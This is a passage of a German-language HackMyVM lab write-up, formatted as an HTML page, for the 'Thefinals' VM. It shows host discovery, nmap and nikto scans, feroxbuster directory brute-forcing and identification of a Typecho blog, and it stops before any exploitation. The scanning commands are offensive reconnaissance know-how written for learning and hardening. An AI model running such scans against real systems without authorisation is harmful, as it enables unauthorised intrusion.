@@ -1,0 +1,1563 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thefinals - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>Thefinals - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container easy">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">dirsearch</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">netcat</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">mysql / mariadb</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">netstat</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">lsof</div>
+                <div class="tool-item">iptables</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                    <pre><span class="command">192.168.2.64</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Der erste Schritt bei der Erkundung war das Auffinden der Ziel-VM in meinem lokalen Netzwerk. Ich setzte `arp-scan` mit dem Parameter `-l` (scanne lokale Netze) ein und filterte die Ausgabe durch `grep "PCS"`, um nach Systemen mit MAC-Adressen des Herstellers PCS Systemtechnik zu suchen, der häufig für VirtualBox-Netzwerkkarten verwendet wird. Anschließend extrahierte ich die IP-Adresse aus der gefilterten Ausgabe mittels `awk '{print $1}'`. Das Ergebnis war die IP-Adresse `192.168.2.64`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Methode ermöglichte eine schnelle und zuverlässige Identifizierung der Ziel-VM anhand ihrer bekannten MAC-Adresse in der virtuellen Netzwerkumgebung. Die extrahierte IP-Adresse `192.168.2.64` war der notwendige Ausgangspunkt für alle weiteren Schritte des Pentests.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie Tools wie `arp-scan` zur schnellen Host-Erkennung im lokalen Netzwerk. Kombinieren Sie dies mit Filtern, um spezifische Hosts effizient zu isolieren.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Netzwerkaktivitäten auf unautorisierte Scans. Verwenden Sie einzigartige MAC-Adressen oder implementieren Sie MAC-Spoofing-Erkennung, um Hosts besser zu identifizieren.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">hosts...</span>
+<span class="command">192.168.2.64   thefinals.hmv</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um die Arbeit mit der Ziel-VM im weiteren Testverlauf zu vereinfachen, fügte ich einen entsprechenden Eintrag in meine lokale `/etc/hosts` Datei hinzu. Ich ordnete die gefundene IP-Adresse `192.168.2.64` dem Hostnamen `thefinals.hmv` zu. Dies erlaubte mir, den Hostnamen anstelle der IP-Adresse in meinen Befehlen zu verwenden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Anlegen von Hostnamen in der `/etc/hosts` Datei ist eine Standardpraxis, die die Lesbarkeit und Benutzerfreundlichkeit der Befehle verbessert. Es ist besonders nützlich, wenn man häufig mit demselben Ziel interagiert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Pflegen Sie eine strukturierte `/etc/hosts` Datei für Ihre Testziele.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie eine zuverlässige DNS-Auflösung für interne Hosts bereit, um manuelle Einträge auf Client-Systemen zu vermeiden.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">Nmap...</span>
+<span class="command">22/tcp open  ssh     OpenSSH 9.9 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.62 ((Unix))</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führte einen ersten, schnellen Nmap-Scan auf das Ziel `thefinals.hmv` durch, um die offenen Ports zu identifizieren. Die gefilterte Ausgabe zeigte, dass die Ports 22 (SSH) und 80 (HTTP) offen sind. Dies gab mir einen sofortigen Überblick über die primären Dienste, die für den Test relevant sein würden. Die Dienstversionen OpenSSH 9.9 und Apache httpd 2.4.62 wurden ebenfalls erkannt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser schnelle Scan war sehr effizient, um die grundlegende Angriffsfläche zu erkennen. Die identifizierten offenen Ports und Dienstversionen sind die notwendigen Informationen, um mit der gezielten Enumeration fortzufahren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie schnelle Nmap-Scans, um die offenen Ports zu identifizieren, bevor Sie tiefere Scans starten.
+                <br><strong>Empfehlung (Admin):</strong> Reduzieren Sie die Anzahl der nach außen exponierten Dienste auf das absolute Minimum.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">Starting Nmap 7.95 ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at 2025-06-26 14:52 CEST</span>
+<span class="command">Nmap scan report for thefinals.hmv (192.168.2.64)</span>
+<span class="command">Host is up (0.00016s latency).</span>
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 9.9 (protocol 2.0)</span>
+| <span class="command">ssh-hostkey:</span>
+|   <span class="command">256 42:a7:04:bb:da:b5:8e:71:7a:89:ff:a4:60:cd:4d:29 (ECDSA)</span>
+<span class="password">|_  ssh-hostkey: 256 37:32:71:ca:3f:11:41:b4:d7:90:1e:c9:7f:e8:bc:20 (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.62 ((Unix))</span>
+<span class="password">|_http-server-header: Apache/2.4.62 (Unix)</span>
+| <span class="command">http-methods:</span>
+<span class="password">|_  Potentially risky methods: TRACE</span>
+<span class="password">|_http-title: THE FINALS</span>
+<span class="command">MAC Address: 08:00:27:56:7F:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Device type: general purpose|router</span>
+<span class="command">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+<span class="command">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+<span class="command">Network Distance: 1 hop</span>
+
+<span class="command">TRACEROUTE</span>
+<span class="command">HOP RTT     ADDRESS</span>
+<span class="command">1   0.16 ms thefinals.hmv (192.168.2.64)</span>
+
+<span class="command">OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .</span>
+<span class="command">Nmap done: 1 IP address (1 host up) scanned in 10.66 seconds</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führte einen umfassenden Nmap-Scan auf `thefinals.hmv` (192.168.2.64) durch, um detaillierte Informationen über alle offenen Ports und laufenden Dienste zu erhalten. Der Scan mit `-sS -sC -sV -p- -T5 -AO` identifizierte Ports 22 (SSH) und 80 (HTTP) als offen. Die Versionen OpenSSH 9.9 und Apache httpd 2.4.62 wurden bestätigt. Für den Webserver auf Port 80 zeigte die Ausgabe den HTTP-Titel "THE FINALS" und wies auf die erlaubte und potenziell riskante HTTP-Methode `TRACE` hin. Die OS-Erkennung schätzte das System als Linux ein. Die MAC-Adresse bestätigte die VirtualBox-Umgebung.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die detaillierte Nmap-Ausgabe lieferte wichtige Ansatzpunkte. Die Versionen von OpenSSH und Apache ermöglichen die Suche nach spezifischen Schwachstellen. Besonders interessant ist die erlaubte `TRACE`-Methode auf dem Webserver, da diese auf die Cross-Site Tracing (XST) Schwachstelle hindeuten kann, obwohl diese in modernen Browsern schwieriger auszunutzen ist. Der HTTP-Titel gibt den Namen der gehosteten Anwendung an. Die Erkennung des Betriebssystems ist nützlich für die spätere Privilegieneskalation.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Recherchieren Sie die gefundenen Dienstversionen auf bekannte Schwachstellen. Achten Sie auf ungewöhnliche erlaubte HTTP-Methoden wie `TRACE` und prüfen Sie, ob diese ausnutzbar sind (z.B. XST). Notieren Sie sich den HTTP-Titel und andere Header-Informationen.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die HTTP TRACE-Methode in der Webserver-Konfiguration, es sei denn, sie wird explizit benötigt. Halten Sie Ihre Dienste auf dem neuesten Stand und patchen Sie bekannte Schwachstellen.
+
+             </p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+<span class="command">::::::::::::::::::::::::: HTTP Records Permissions :::::::::::::::::::::::::</span>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+
+<span class="command">Allow: GET,POST,OPTIONS,HEAD,TRACE</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die erlaubten HTTP-Methoden auf dem Webserver auf Port 80 explizit abgefragt. Die Antwort bestätigte die erlaubten Methoden: `GET`, `POST`, `OPTIONS`, `HEAD` und, wie im Nmap-Scan angedeutet, `TRACE`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Bestätigung der erlaubten Methoden ist wichtig. Die `TRACE`-Methode ist hier das auffälligste Element, da sie in den meisten modernen Webserver-Konfigurationen standardmäßig deaktiviert ist und auf die Cross-Site Tracing (XST) Schwachstelle hindeuten kann. Obwohl XST in der Praxis oft schwierig auszunutzen ist, ist das Vorhandensein der `TRACE`-Methode ein Indikator für eine potenziell weniger gehärtete Konfiguration.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Achten Sie auf erlaubte HTTP-Methoden, die über die Standards (GET, POST) hinausgehen. Prüfen Sie, ob die `TRACE`-Methode tatsächlich zu XST-Schwachstellen führt.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die HTTP TRACE-Methode auf allen Produktions-Webservern. Dies ist eine einfache, aber effektive Härtungsmaßnahme.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+<span class="command">:::::::::::::::::::::::::::::::: Nikto Scan ::::::::::::::::::::::::::::::::</span>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+
+<span class="command">- Nikto v2.5.0</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.64</span>
+<span class="command">+ Target Hostname:    192.168.2.64</span>
+<span class="command">+ Target Port:        80</span>
+<span class="password">+ Start Time:         2025-06-26 14:53:31 (GMT2)</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="password">+ Server: Apache/2.4.62 (Unix)</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="command">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span>
+<span class="password">+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE .</span>
+<span class="password">+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: [Link: https://owasp.org/www-community/attacks/Cross_Site_Tracing | Ziel: https://owasp.org/www-community/attacks/Cross_Site_Tracing]</span>
+<span class="password">+ /css/: Directory indexing found.</span>
+<span class="password">+ /css/: This might be interesting.</span>
+<span class="password">+ /images/: Directory indexing found.</span>
+<span class="command">+ 8103 requests: 0 error(s) and 7 item(s) reported on remote host</span>
+<span class="password">+ End Time:         2025-06-26 14:54:04 (GMT2) (33 seconds)</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ 1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führte einen `nikto`-Scan auf dem Webserver auf Port 80 (`http://192.168.2.64`) durch. Nikto ist ein spezialisierter Webserver-Scanner, der nach tausenden von Schwachstellen und Konfigurationsproblemen sucht. Die Ausgabe bestätigte die Apache-Version und die erlaubten HTTP-Methoden, einschließlich `TRACE`. Nikto meldete auch fehlende Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`), was gängige, wenn auch oft nicht kritische Web-Schwachstellen ermöglicht. Wichtiger waren die Hinweise auf `Directory indexing found` in den Verzeichnissen `/css/` und `/images/`. Dies bedeutet, dass der Webserver den Inhalt dieser Verzeichnisse auflistet, anstatt eine Standardseite anzuzeigen oder den Zugriff zu verweigern.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Nikto-Scan lieferte zwei sehr klare und vielversprechende Angriffspunkte: die aktivierte `TRACE`-Methode und die Verzeichnislistung in `/css/` und `/images/`. Die Verzeichnislistung ist eine schwerwiegende Fehlkonfiguration, die es Angreifern erlaubt, alle Dateien in diesen Verzeichnissen zu sehen und herunterzuladen, ohne deren Namen zu kennen. Dies ist oft ein schneller Weg, um sensible Dateien oder weitere Enumerationsziele zu finden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie immer alle Verzeichnisse, bei denen Nikto oder andere Tools Verzeichnislistung melden. Laden Sie alle interessanten Dateien herunter und analysieren Sie sie sorgfältig. Beachten Sie auch die weniger kritischen Funde wie fehlende Header als Indikatoren für die allgemeine Sicherheitshaltung.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die automatische Verzeichnislistung auf allen Webservern. Konfigurieren Sie stattdessen eine Standard-Indexdatei (z.B. index.html) oder geben Sie einen 403 Forbidden Fehler zurück. Konfigurieren Sie Webserver mit empfohlenen Sicherheits-Headern.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">feroxbuster --url "http://thefinals.hmv" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 301 302</span></div>
+                    <pre><span class="command"> ___  ___  __   __     __      __         __   ___</span>
+<span class="command">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
+<span class="command">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
+<span class="command">by Ben "epi" Risher 🤓                 ver: 2.11.0</span>
+<span class="command">───────────────────────────┬──────────────────────</span>
+<span class="command"> 🎯  Target Url            │ http://thefinals.hmv</span>
+<span class="command"> 🚀  Threads               │ 50</span>
+<span class="command"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+<span class="command"> 👌  Status Codes          │ [301, 302]</span>
+<span class="command"> 💥  Timeout (secs)        │ 7</span>
+<span class="command"> 🦡  User-Agent            │ feroxbuster/2.11.0</span>
+<span class="command"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span>
+<span class="command"> 🔎  Extract Links         │ true</span>
+<span class="command"> 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
+<span class="command"> 🏁  HTTP methods          │ [GET]</span>
+<span class="command"> 🔃  Recursion Depth       │ 4</span>
+<span class="command">───────────────────────────┴──────────────────────</span>
+<span class="command"> 🏁  Press [ENTER] to use the Scan Management Menu™</span>
+<span class="command">──────────────────────────────────────────────────</span>
+<span class="password">301      GET        9l       28w      313c http://thefinals.hmv/images --> http://thefinals.hmv/images/</span>
+<span class="password">301      GET        9l       28w      311c http://thefinals.hmv/blog --> http://thefinals.hmv/blog/</span>
+<span class="password">301      GET        9l       28w      318c http://thefinals.hmv/screenshots --> http://thefinals.hmv/screenshots/</span>
+<span class="password">301      GET        9l       28w      310c http://thefinals.hmv/css --> http://thefinals.hmv/css/</span>
+<span class="password">301      GET        9l       28w      309c http://thefinals.hmv/js --> http://thefinals.hmv/js/</span>
+<span class="password">301      GET        9l       28w      317c http://thefinals.hmv/blog/admin --> http://thefinals.hmv/blog/admin/</span>
+<span class="password">301      GET        9l       28w      321c http://thefinals.hmv/blog/admin/img --> http://thefinals.hmv/blog/admin/img/</span>
+<span class="password">302      GET        0l        0w        0c http://thefinals.hmv/blog/admin/register.php --> http://thefinals.hmv/blog/</span>
+<span class="password">302      GET        0l        0w        0c http://thefinals.hmv/blog/admin/category.php --> http://thefinals.hmv/blog/admin/login.php?referer=http%3A%2F%2Fthefinals.hmv%2Fblog%2Fadmin%2Fcategory.php</span>
+<span class="command">[>-------------------] - 40s   626879/18536672 19m     found:27      errors:0</span>
+<span class="command">[>-------------------] - 40s   241640/6175344 5989/s  http://thefinals.hmv/</span>
+<span class="command">[####################] - 1s   6175344/6175344 10777215/s http://thefinals.hmv/images/ --> Directory listing (add --scan-dir-listings to scan)</span>
+<span class="command">[####################] - 0s   6175344/6175344 39585538/s http://thefinals.hmv/images/arena/ --> Directory listing (add --scan-dir-listings to scan)</span>
+<span class="command">[####################] - 1s   6175344/6175344 10628819/s http://thefinals.hmv/images/sponsors/ --> Directory listing (add --scan-dir-listings to scan)</span>
+<span class="command">[>-------------------] - 39s   194320/6175344 4974/s  http://thefinals.hmv/blog/</span>
+<span class="command">[####################] - 1s   6175344/6175344 7530907/s http://thefinals.hmv/screenshots/ --> Directory listing (add --scan-dir-listings to scan)</span>
+<span class="command">[####################] - 0s   6175344/6175344 -       http://thefinals.hmv/css/ --> Directory listing (add --scan-dir-listings to scan)</span>
+<span class="command">[####################] - 0s   6175344/6175344 3087672000/s http://thefinals.hmv/js/ --> Directory listing (add --scan-dir-listings to scan)</span>
+<span class="command">[>-------------------] - 35s   187936/6175344 5364/s  http://thefinals.hmv/blog/admin/</span>
+<span class="command">[####################] - 0s   6175344/6175344 13083356/s http://thefinals.hmv/blog/admin/img/ --> Directory listing (add --scan-dir-listings to scan)</span>
+<span class="command">[####################] - 0s   6175344/6175344 475026462/s http://thefinals.hmv/blog/install/ --> Directory listing (add --scan-dir-listings to scan)</span>
+<span class="command">[####################] - 0s   6175344/6175344 21004571/s http://thefinals.hmv/blog/admin/css/ --> Directory listing (add --scan-dir-listings to scan)[#>------------------] - 2m   1425278/18536672 23m     found:27      errors:0</span>
+<span class="command">🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_thefinals_hmv-1750948203.state ...</span>
+<span class="command">[#>------------------] - 2m   1425668/18536672 23m     found:27      errors:0</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich setzte `feroxbuster`, ein weiteres schnelles Tool für die Web-Enumeration, auf das Ziel `http://thefinals.hmv` ein. Ich verwendete eine mittelgroße Wordlist und eine breite Palette von Dateiendungen. Diesmal filterte ich die Ergebnisse auf Statuscodes 301 (Moved Permanently) und 302 (Found), da diese auf die Existenz von Verzeichnissen oder Dateien hindeuten, die auf andere Pfade umleiten. Die Ausgabe zeigte viele 301-Umleitungen für Verzeichnisse wie `/images`, `/blog`, `/screenshots`, `/css`, `/js`, `/blog/admin` und `/blog/admin/img`. Es gab auch 302-Umleitungen für spezifische PHP-Dateien im Admin-Bereich (`/blog/admin/register.php`, `/blog/admin/category.php`), die auf die Login-Seite umleiteten, was auf eine zugrundeliegende Blog-Plattform hindeutet. Feroxbuster meldete auch Verzeichnislistung für einige dieser Pfade, wie bereits von Nikto berichtet. Ich brach den Scan nach einiger Zeit ab, da bereits viele relevante Pfade gefunden wurden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Feroxbuster bestätigte und erweiterte die Funde von Nikto. Die zahlreichen 301-Umleitungen auf Verzeichnisse, insbesondere unter `/blog/` und `/blog/admin/`, deuten auf eine komplexere Webanwendungsstruktur hin. Das Vorhandensein von Login-Seiten (`login.php`) und anderen PHP-Dateien (`register.php`, `category.php`) im Admin-Bereich sowie die Umleitungen deuten stark auf eine Blog- oder Content-Management-System-Installation hin. Die Verzeichnislistungen sind bestätigte Schwachstellen, die ich als Nächstes untersuchen werde. Die vielen Funde im `/blog` Pfad machen diesen Bereich zum primären Ziel für die weitere Enumeration.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie verschiedene Tools für die Web-Enumeration und passen Sie die Filter (Statuscodes, Erweiterungen) an, um verschiedene Arten von Funden zu erhalten (z.B. Umleitungen, 200 OK). Untersuchen Sie Verzeichnisse, die Verzeichnislistung aktiviert haben, immer zuerst.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die Verzeichnislistung auf allen Verzeichnissen. Verwenden Sie Umleitungen sparsam und stellen Sie sicher, dass sie korrekt konfiguriert sind. Überwachen Sie Brute-Force-Angriffe auf Verzeichnis- und Dateinamen.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://thefinals.hmv/blog/index.php/archives/5/</span>
+
+<span class="command">Update 4.0.0 | Season 4</span>
+
+    <span class="command">Author:staff Time: 2024-09-26 Category:default category</span>
+
+<span class="command">IT’S SHOWTIME!</span>
+<span class="command">Welcome to Season 4, Contestants!</span>
+
+<span class="command">Season 4 brings exciting new content and features to THE FINALS! From the sleek, urban Fortune Stadium map sponsored by HOLTOW, ENGIMO, and ISEUL-T, to three powerful new weapons, there's plenty to dive into.</span>
+
+<span class="command">We’ve also added sponsor contracts, allowing players to sign up with one of our three sponsors for unique rewards, new World Tour ranks, and improved Ranked Cashout Tournaments. Plus, new customization options, loadout slots, and revamped leaderboards ensure a more competitive and personalized experience.</span>
+
+<span class="command">Read about all the changes below, and gear up for the most spectacular season of the gameshow yet!</span>
+
+<span class="command">Tag:none</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://thefinals.hmv/blog/index.php/archives/6/</span>
+
+<span class="command">SEASON 5: NEXT STAGE STARTS NOW</span>
+
+    <span class="command">Author:staff Time: 2024-12-12 Category:default category</span>
+
+<span class="command">The spotlight is on, and Season 5 of THE FINALS begins right now! This isn’t just another season—it’s a celebration of an unforgettable year since THE FINALS launched! Over four thrilling seasons, we’ve redefined competition in the ultimate game show. Now, it’s time for the Next Stage.</span>
+
+<span class="command">Season 4 honored our amazing community by bringing back the thrill of Ranked Tournaments, unveiling the vibrant Fortune Stadium, and amplifying everything that makes THE FINALS extraordinary. But this new season isn’t just about looking back, it’s about blazing forward with exciting surprises, groundbreaking features, and a breathtaking new arena.</span>
+
+<span class="command">Get ready to dive into Season 5, the most exhilarating chapter of THE FINALS yet!</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://thefinals.hmv/blog/index.php/archives/16/</span>
+
+<span class="command">THE FINALS Update Tracker</span>
+
+<span class="command">Only for professional players.</span>
+<span class="command">Search keywords.</span>
+<span class="command">Index page</span>
+<span class="command">About</span>
+<span class="command">404 - Page not found.</span>
+
+<span class="command">The page you requested has been moved or deleted. Do you want to use search?</span>
+
+<span class="password">© 2025 THE FINALS Update Tracker. Proudly powered by Typecho..</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich untersuchte die Inhalte des `/blog` Verzeichnisses genauer, indem ich verschiedene URLs wie `/blog/index.php/archives/5/`, `/blog/index.php/archives/6/` und `/blog/index.php/archives/16/` direkt im Browser aufrief. Diese Pfade zeigten Blog-Einträge, die sich auf "THE FINALS" bezogen und Updates, Seasons und Features des Spiels beschrieben. Der Eintrag `/blog/index.php/archives/16/` war besonders interessant, da er den Text "THE FINALS Update Tracker", "Only for professional players.", "Search keywords." enthielt und im Footer die Zeile "© 2025 THE FINALS Update Tracker. Proudly powered by <span class="password">Typecho</span>.." zeigte.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden der Blog-Beiträge bestätigte die Art der Webanwendung – ein Blog oder CMS. Der Footer auf `/blog/index.php/archives/16/` identifizierte klar die verwendete Software: Typecho. Dies ist eine entscheidende Information, da ich nun gezielt nach bekannten Schwachstellen für Typecho suchen kann. Die Einträge selbst enthielten Spielinformationen, aber keine offensichtlichen Zugangsdaten. Die Notiz "Only for professional players." könnte auf einen geschützten Bereich hinweisen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Identifizieren Sie immer die verwendete Software (CMS, Framework, spezifische Anwendung) einer Webanwendung. Suchen Sie nach Fußzeilen, Metatags, spezifischen Dateipfaden oder verwenden Sie Tools wie Wappalyzer. Recherchieren Sie gezielt nach bekannten Schwachstellen für die identifizierte Softwareversion.
+                <br><strong>Empfehlung (Admin):</strong> Verbergen Sie die Version der verwendeten Software, wo immer möglich, um gezielte Angriffe zu erschweren. Entfernen Sie identifizierende Fußzeilen oder Metatags.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">view-source:http://thefinals.hmv/blog/index.php/search/4/</span>
+< <span class="command">title</span> >Posts include the keyword 4 - THE FINALS Update Tracker< <span class="command">/title</span> >
+
+<span class="command">Posts include the keyword 4</span>
+<span class="command">SEASON 5: NEXT STAGE STARTS NOW</span>
+
+    <span class="command">Author:staff Time: 2024-12-12 Category:default category Add a comment</span>
+
+<span class="command">The spotlight is on, and Season 5 of THE FINALS begins right now! This isn’t just another season—it’s a celebration of an unforgettable year since THE FINALS launched! Over four thrilling seasons, we’ve redefined competition in the ultimate game show. Now, it’s time for the Next Stage.</span>
+
+<span class="command">Season 4 honored our amazing community by bringing back the thrill of Ranked Tournaments, unveiling the vibrant Fortune Stadium, and amplifying everything that makes THE FINALS extraordinary. But this new season isn’t just about looking back, it’s about blazing forward with exciting surprises, groundbreaking features, and a breathtaking new arena.</span>
+
+<span class="command">Get ready to dive into Season 5, the most exhilarating chapter of THE FINALS yet!</span>
+<span class="command">Update 4.0.0 | Season 4</span>
+
+    <span class="command">Author:staff Time: 2024-09-26 Category:default category Add a comment</span>
+
+<span class="command">IT’S SHOWTIME!</span>
+<span class="command">Welcome to Season 4, Contestants!</span>
+
